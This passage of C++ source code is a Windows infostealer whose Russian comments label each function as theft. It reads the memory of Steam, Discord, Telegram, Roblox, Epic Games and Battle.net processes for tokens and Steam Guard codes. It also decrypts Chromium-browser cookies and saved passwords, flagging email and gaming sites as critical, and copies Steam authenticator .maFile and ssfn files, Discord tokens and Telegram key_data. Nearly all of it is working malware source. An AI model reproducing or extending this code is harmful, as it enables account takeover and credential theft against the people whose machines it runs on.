            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096] = {0};
                    SIZE_T bytesRead = 0;
                    MEMORY_BASIC_INFORMATION mbi{};
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex wsRegex("wss?://[^\\s]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, wsRegex)) {
                                    result += "WebSocket URL: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex steamGuardRegex("Steam Guard Code: [A-Z0-9]{5}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, steamGuardRegex)) {
                                    result += "Steam Guard Code: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, tokenRegex)) {
                                    result += "WebSocket Token: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Захват WebRTC сессий
std::string CaptureWebRTCSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create process snapshot for WebRTC capture"));
        return result;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096] = {0};
                    SIZE_T bytesRead = 0;
                    MEMORY_BASIC_INFORMATION mbi{};
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex webrtcRegex("ice-ufrag:[a-zA-Z0-9+/=]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, webrtcRegex)) {
                                    result += "WebRTC ICE Candidate: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex ipRegex("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, ipRegex)) {
                                    result += "WebRTC IP: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Кража несохраненных данных браузера
std::string StealUnsavedBrowserData(const std::string& browserName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Cache path not found for " + browserName + ": " + cachePath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.path().extension() == ".tmp" || entry.path().filename().string().find("Cache") != std::string::npos) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open cache file for " + browserName + ": " + entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::regex emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, emailRegex)) {
                    result += "[" + browserName + "] Unsaved Email: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex passRegex("pass(?:word)?=[^&\\s]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, passRegex)) {
                    result += "[" + browserName + "] Unsaved Password: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex autofillRegex("\"autofill\":\"[^\"]+\"");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, autofillRegex)) {
                    result += "[" + browserName + "] Autofill Data: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                    result += "[" + browserName + "] Unsaved Session: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }
            }
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealUnsavedBrowserData for " + browserName + ": " + e.what()));
    }

    return result;
}

// Кража кэшированных данных приложений
std::string StealAppCacheData(const std::string& appName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Cache path not found for " + appName + ": " + cachePath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.path().filename().string().find("cache") != std::string::npos || entry.path().extension() == ".tmp") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open cache file for " + appName + ": " + entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                    result += "[" + appName + "] Cached Token: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, emailRegex)) {
                    result += "[" + appName + "] Cached Email: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                    result += "[" + appName + "] Cached Session: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }
            }
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error in StealAppCacheData for " + appName + ": " + e.what()));
    }

    return result;
}

// Кража данных Chromium
std::string StealChromiumData(const std::string& browserName, const std::string& dbPath) {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;

    std::string cookiesDbPath = dbPath + "Cookies";
    std::string loginDbPath = dbPath + "Login Data";
    sqlite3* db = nullptr;

    // Кража cookies
    if (g_mainWindow->config.cookies && std::filesystem::exists(cookiesDbPath)) {
        if (sqlite3_open(cookiesDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                    std::string value = DecryptChromiumData(encryptedData);
                    if (!value.empty()) {
                        if (host.find("mail.google.com") != std::string::npos || host.find("outlook.com") != std::string::npos ||
                            host.find("yahoo.com") != std::string::npos || host.find("mail.ru") != std::string::npos ||
                            host.find("aol.com") != std::string::npos || host.find("protonmail.com") != std::string::npos ||
                            host.find("icloud.com") != std::string::npos || host.find("steampowered.com") != std::string::npos ||
                            host.find("roblox.com") != std::string::npos) {
                            result += "[" + browserName + "] Critical Cookie (" + host + ") | " + name + " | " + value + "\n";
                        } else {
                            result += "[" + browserName + "] Cookie | " + host + " | " + name + " | " + value + "\n";
                        }
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to prepare SQLite statement for cookies in " + browserName));
            }
            sqlite3_close(db);
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Cookies database for " + browserName));
        }
    }

    // Кража паролей
    db = nullptr;
    if (g_mainWindow->config.passwords && std::filesystem::exists(loginDbPath)) {
        if (sqlite3_open(loginDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                    std::string password = DecryptChromiumData(encryptedData);
                    if (!password.empty()) {
                        if (url.find("mail.google.com") != std::string::npos || url.find("outlook.com") != std::string::npos ||
                            url.find("yahoo.com") != std::string::npos || url.find("mail.ru") != std::string::npos ||
                            url.find("aol.com") != std::string::npos || url.find("protonmail.com") != std::string::npos ||
                            url.find("icloud.com") != std::string::npos || url.find("steampowered.com") != std::string::npos ||
                            url.find("roblox.com") != std::string::npos) {
                            result += "[" + browserName + "] Critical Password (" + url + ") | " + username + " | " + password + "\n";
                        } else {
                            result += "[" + browserName + "] Password | " + url + " | " + username + " | " + password + "\n";
                        }
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to prepare SQLite statement for passwords in " + browserName));
            }
            sqlite3_close(db);
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Login Data database for " + browserName));
        }
    }

    return result;
}

// Кража данных браузеров
std::string StealBrowserData() {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    char* localAppDataPath = nullptr;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get LOCALAPPDATA path"));
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    // Путь к данным браузеров
    std::vector<std::pair<std::string, std::string>> browserPaths = {
        {"Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", appData + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", appData + "\\Opera Software\\Opera GX Stable\\"}
    };

    // Кража данных Chromium-браузеров
    for (const auto& browser : browserPaths) {
        std::string browserData = StealChromiumData(browser.first, browser.second);
        if (!browserData.empty()) {
            result += browserData;
        }
        std::string unsavedData = StealUnsavedBrowserData(browser.first, browser.second + "Cache\\");
        if (!unsavedData.empty()) {
            result += unsavedData;
        }
    }

    return result;
}

// Кража данных Steam
std::string StealSteamData() {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.steam && !g_mainWindow->config.steamMAFile)) return result;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Steam registry key"));
        return result;
    }

    char steamPath[MAX_PATH] = {0};
    DWORD pathSize = sizeof(steamPath);
    if (RegQueryValueExA(hKey, "SteamPath", nullptr, nullptr, (LPBYTE)steamPath, &pathSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to read SteamPath from registry"));
        return result;
    }
    RegCloseKey(hKey);

    std::string steamDir(steamPath);
    if (steamDir.back() != '\\') steamDir += "\\";

    // Кража конфигурационных файлов
    if (g_mainWindow->config.steam) {
        std::string configPath = steamDir + "config\\loginusers.vdf";
        if (std::filesystem::exists(configPath)) {
            std::ifstream configFile(configPath);
            if (configFile.is_open()) {
                std::string content((std::istreambuf_iterator<char>(configFile)), std::istreambuf_iterator<char>());
                configFile.close();
                result += "[Steam] Login Users:\n" + content + "\n";
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->emitLog(QString("Extracted Steam loginusers.vdf"));
            } else {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Steam loginusers.vdf"));
            }
        }

        std::string ssfnPath;
        try {
            for (const auto& entry : std::filesystem::directory_iterator(steamDir)) {
                if (entry.path().filename().string().find("ssfn") != std::string::npos) {
                    ssfnPath = entry.path().string();
                    std::ifstream ssfnFile(ssfnPath, std::ios::binary);
                    if (ssfnFile.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(ssfnFile)), std::istreambuf_iterator<char>());
                        ssfnFile.close();
                        result += "[Steam] SSFN File (" + ssfnPath + "):\n" + content + "\n";
                        std::lock_guard<std::mutex> lock(g_mutex);
                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Extracted Steam SSFN file: " + ssfnPath));
                    } else {
                        std::lock_guard<std::mutex> lock(g_mutex);
                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Steam SSFN file: " + ssfnPath));
                    }
                    break;
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Steam directory: " + std::string(e.what())));
        }

        // Захват WebSocket сессий Steam
        std::string wsData = CaptureWebSocketSessions("steam.exe");
        if (!wsData.empty()) {
            result += "[Steam] WebSocket Data:\n" + wsData + "\n";
        }

        // Захват WebRTC сессий Steam
        std::string webrtcData = CaptureWebRTCSessions("steam.exe");
        if (!webrtcData.empty()) {
            result += "[Steam] WebRTC Data:\n" + webrtcData + "\n";
        }
    }

    // Кража MA файлов (Steam Guard)
    if (g_mainWindow->config.steamMAFile) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(steamDir)) {
                if (entry.path().extension() == ".maFile") {
                    std::string maFilePath = entry.path().string();
                    std::ifstream maFile(maFilePath);
                    if (maFile.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(maFile)), std::istreambuf_iterator<char>());
                        maFile.close();
                        result += "[Steam] MA File (" + maFilePath + "):\n" + content + "\n";
                        std::lock_guard<std::mutex> lock(g_mutex);
                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Extracted Steam MA file: " + maFilePath));
                    } else {
                        std::lock_guard<std::mutex> lock(g_mutex);
                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Steam MA file: " + maFilePath));
                    }
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Steam MA files: " + std::string(e.what())));
        }
    }

    return result;
}

// Кража данных Epic Games
std::string StealEpicGamesData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.epic) return result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get LOCALAPPDATA path for Epic Games"));
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
    if (!std::filesystem::exists(epicPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Epic Games config path not found: " + epicPath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::directory_iterator(epicPath)) {
            if (entry.path().filename() == "GameUserSettings.ini") {
                std::ifstream iniFile(entry.path());
                if (iniFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(iniFile)), std::istreambuf_iterator<char>());
                    iniFile.close();
                    result += "[Epic Games] GameUserSettings.ini:\n" + content + "\n";
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString("Extracted Epic Games GameUserSettings.ini"));
                } else {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Epic Games GameUserSettings.ini"));
                }
            }
        }

        std::string cachePath = localAppData + "\\EpicGamesLauncher\\Saved\\webcache\\";
        std::string cacheData = StealAppCacheData("Epic Games", cachePath);
        if (!cacheData.empty()) {
            result += "[Epic Games] Cache Data:\n" + cacheData + "\n";
        }

        std::string wsData = CaptureWebSocketSessions("EpicGamesLauncher.exe");
        if (!wsData.empty()) {
            result += "[Epic Games] WebSocket Data:\n" + wsData + "\n";
        }

        std::string webrtcData = CaptureWebRTCSessions("EpicGamesLauncher.exe");
        if (!webrtcData.empty()) {
            result += "[Epic Games] WebRTC Data:\n" + webrtcData + "\n";
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Epic Games data: " + std::string(e.what())));
    }

    return result;
}

// Кража данных Roblox
std::string StealRobloxData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.roblox) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for Roblox"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string robloxPath = appData + "\\Roblox\\";
    if (!std::filesystem::exists(robloxPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Roblox path not found: " + robloxPath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(robloxPath)) {
            if (entry.path().filename().string().find("GlobalBasicSettings") != std::string::npos) {
                std::ifstream settingsFile(entry.path());
                if (settingsFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(settingsFile)), std::istreambuf_iterator<char>());
                    settingsFile.close();
                    result += "[Roblox] GlobalBasicSettings:\n" + content + "\n";
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Extracted Roblox GlobalBasicSettings: " + entry.path().string()));
                } else {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Roblox GlobalBasicSettings: " + entry.path().string()));
                }
            }
        }

        std::string cachePath = robloxPath + "HttpCache\\";
        std::string cacheData = StealAppCacheData("Roblox", cachePath);
        if (!cacheData.empty()) {
            result += "[Roblox] Cache Data:\n" + cacheData + "\n";
        }

        std::string wsData = CaptureWebSocketSessions("RobloxPlayerBeta.exe");
        if (!wsData.empty()) {
            result += "[Roblox] WebSocket Data:\n" + wsData + "\n";
        }

        std::string webrtcData = CaptureWebRTCSessions("RobloxPlayerBeta.exe");
        if (!webrtcData.empty()) {
            result += "[Roblox] WebRTC Data:\n" + webrtcData + "\n";
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Roblox data: " + std::string(e.what())));
    }

    return result;
}

// Кража данных Battle.net
std::string StealBattleNetData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.battlenet) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for Battle.net"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string battleNetPath = appData + "\\Battle.net\\";
    if (!std::filesystem::exists(battleNetPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Battle.net path not found: " + battleNetPath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::directory_iterator(battleNetPath)) {
            if (entry.path().filename() == "Battle.net.config") {
                std::ifstream configFile(entry.path());
                if (configFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(configFile)), std::istreambuf_iterator<char>());
                    configFile.close();
                    result += "[Battle.net] Config:\n" + content + "\n";
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString("Extracted Battle.net config"));
                } else {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Battle.net config"));
                }
            }
        }

        std::string cachePath = battleNetPath + "Cache\\";
        std::string cacheData = StealAppCacheData("Battle.net", cachePath);
        if (!cacheData.empty()) {
            result += "[Battle.net] Cache Data:\n" + cacheData + "\n";
        }

        std::string wsData = CaptureWebSocketSessions("Battle.net.exe");
        if (!wsData.empty()) {
            result += "[Battle.net] WebSocket Data:\n" + wsData + "\n";
        }

        std::string webrtcData = CaptureWebRTCSessions("Battle.net.exe");
        if (!webrtcData.empty()) {
            result += "[Battle.net] WebRTC Data:\n" + webrtcData + "\n";
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Battle.net data: " + std::string(e.what())));
    }

    return result;
}

// Кража данных Discord
std::string StealDiscordData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.discord) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for Discord"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string discordPath = appData + "\\discord\\Local Storage\\leveldb\\";
    if (!std::filesystem::exists(discordPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Discord path not found: " + discordPath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
            if (entry.path().extension() == ".ldb") {
                std::ifstream ldbFile(entry.path(), std::ios::binary);
                if (ldbFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(ldbFile)), std::istreambuf_iterator<char>());
                    ldbFile.close();

                    std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                        result += "[Discord] Token: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                } else {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Discord .ldb file: " + entry.path().string()));
                }
            }
        }

        std::string wsData = CaptureWebSocketSessions("Discord.exe");
        if (!wsData.empty()) {
            result += "[Discord] WebSocket Data:\n" + wsData + "\n";
        }

        std::string webrtcData = CaptureWebRTCSessions("Discord.exe");
        if (!webrtcData.empty()) {
            result += "[Discord] WebRTC Data:\n" + webrtcData + "\n";
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Discord data: " + std::string(e.what())));
    }

    return result;
}

// Кража данных Telegram
std::string StealTelegramData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.telegram) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for Telegram"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
    if (!std::filesystem::exists(telegramPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Telegram path not found: " + telegramPath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
            if (entry.path().filename().string().find("key_data") != std::string::npos) {
                std::ifstream keyFile(entry.path(), std::ios::binary);
                if (keyFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(keyFile)), std::istreambuf_iterator<char>());
                    keyFile.close();
                    result += "[Telegram] Key Data:\n" + content + "\n";
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString("Extracted Telegram key_data"));
                } else {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Telegram key_data: " + entry.path().string()));
                }
            }
        }

        std::string wsData = CaptureWebSocketSessions("Telegram.exe");
        if (!wsData.empty()) {
            result += "[Telegram] WebSocket Data:\n" + wsData + "\n";
        }

        std::string webrtcData = CaptureWebRTCSessions("Telegram.exe");
        if (!webrtcData.empty()) {
            result += "[Telegram] WebRTC Data:\n" + webrtcData + "\n";
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Telegram data: " + std::string(e.what())));
    }

    return result;
}

// Кража данных Minecraft
std::string StealMinecraftData() {
    std::string result;
    if (!g_mainWindow || !g_mainWindow->config.minecraft) return result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to get APPDATA path for Minecraft"));
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string minecraftPath = appData + "\\.minecraft\\";
    if (!std::filesystem::exists(minecraftPath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Minecraft path not found: " + minecraftPath));
        return result;
    }

    try {
        std::string launcherProfilesPath = minecraftPath + "launcher_profiles.json";
        if (std::filesystem::exists(launcherProfilesPath)) {
            std::ifstream profilesFile(launcherProfilesPath);
            if (profilesFile.is_open()) {
                std::string content((std::istreambuf_iterator<char>(profilesFile)), std::istreambuf_iterator<char>());
                profilesFile.close();
                result += "[Minecraft] Launcher Profiles:\n" + content + "\n";
